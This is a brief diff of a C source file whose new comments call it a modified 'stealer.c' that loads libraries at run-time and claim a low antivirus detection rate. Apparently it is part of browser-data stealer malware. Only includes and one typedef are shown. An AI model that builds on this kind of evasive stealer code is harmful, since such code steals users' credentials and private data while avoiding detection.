@@ -3,7 +3,8 @@
 #include <tchar.h>
 #include <wininet.h>
 
-//Loads all libraries at run-time
+//modified version of https://github.com/1d8/spybrowse/blob/master/stealer.c which loads all libraries all run-time
+//low detection rate (see attached img)
 
 int main() {
 	typedef UINT (CALLBACK* LPFNDLLFUNC1)(DWORD,UINT);
